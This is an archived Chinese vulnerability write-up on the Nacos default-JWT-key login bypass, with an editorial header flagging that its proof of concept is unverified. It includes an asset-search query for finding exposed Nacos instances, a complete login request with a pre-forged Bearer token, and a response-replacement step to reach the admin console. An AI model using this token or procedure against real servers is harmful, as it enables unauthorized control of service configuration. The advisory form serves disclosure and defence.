---
source: "gelusus/wxvl 公众号漏洞文库"
title: "Nacos默认key导致权限绕过登陆漏洞 附POC"
product: "Nacos默认token secret"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "QVD-2023-6271"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "<=2.2.0所称范围且仍用默认JWT密钥，伪造sub必须对应有效用户/权限"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-b50ed791f7e4032cc4a957ac"
entity_id: "ve-b50ed791f7e4032cc4a957ac"
schema_version: "1"
canonical: "Web安全/中间件/Alibaba Nacos/Nacos默认key导致权限绕过登陆漏洞 附POC.md"
---

# Nacos默认key导致权限绕过登陆漏洞 附POC

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：<=2.2.0所称范围且仍用默认JWT密钥，伪造sub必须对应有效用户/权限
- 证据范围：固定长寿命token加客户端替换登录响应，不足以证明后续受保护API成功；与24近同流程

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。
- 移除 2 组不含任何正文的空代码围栏；保留全部非空代码。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- HTTP头body间空行丢失；空代码块多
- JWT构造步骤/实际密钥字节未解释，无法确认所给token适用条件
- 登录页面变化不是服务器授权证据；完整控制/植入代码需后续链
- 缺明确修复版、密钥轮换要求，升级未必改现有配置

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

安服仔
                    安服仔  北风漏洞复现文库   2026-02-04 03:03  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
  
N  
acos默认key导致权限绕过登陆漏洞  
  
  
02  
  
—  
  
影响版本  
  
Nacos在版本≤2.2.0时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOrrl3Y7PaVCwPibpubyejDSoHfB4dtsgb7snaL3HH4cXDYNqc6KibWgESA/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
Nacos是一个易于使用的平台，专为动态服务发现和配置以及服务管理而设计。可以帮助您轻松构建云原生应用程序和微服务平台。  
Nacos在版本≤2.2.0时，默认未修改JWT的签名密钥，该密钥硬编码为固定值。攻击者可利用此默认密钥生成合法的JWT令牌,伪造用户身份，绕过身份认证直接登录后台  
。  
攻击者可通过伪造令牌获取管理员权限,进而操作服务配置、窃取敏感数据，甚至植入恶意代码，导致系统完全受控。  
  
04  
  
—  
  
资产测绘  
```
app="Nacos"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOrqyhXxz6SYe662gFDwDOTmYxscHEqiaQlSOCe2eIHscHyal1tgv4uiaRw/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```http
POST /nacos/v1/auth/users/login HTTP/1.1
Host: 127.0.0.1
Content-Length: 28
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA3MDk1MzY0M30.XPfd1WnNHqQdu5-D734ishsizYCEbsQG7mVwdm4MyWg
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
username=nacos&password=1111
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOrjflr7ibUKDnkrWv5ia9l8ZwbRmibLsw0W9yiae0tZSMq2tMyvVa42FaNeA/640?wx_fmt=png&from=appmsg "")  
  
  
```
在账号密码错误的情况下返回包为403
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOr4EXGsMbD8MPaObybd1WkyYEZ0KgD3tWuvSdvXH6pFLiaEbhS8ibtnOyQ/640?wx_fmt=png&from=appmsg "")  
```
将拦截的返回包替换为之前的返回包内容
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOrjNE6zeAfOh14tf1NO843K6uUQAic9ZPP46Aia8ennIy6Ok917HjAz8GQ/640?wx_fmt=png&from=appmsg "")  
```
发包之后成功登录后台
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhIgKRN9ZP9hictPQO2sg8WOr7Riaa7OEkcn0ucjkAM4uHkKl2PCnHes4mkKxTQ3MiabkhRdA5u41Fukw/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级到最新版本。  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
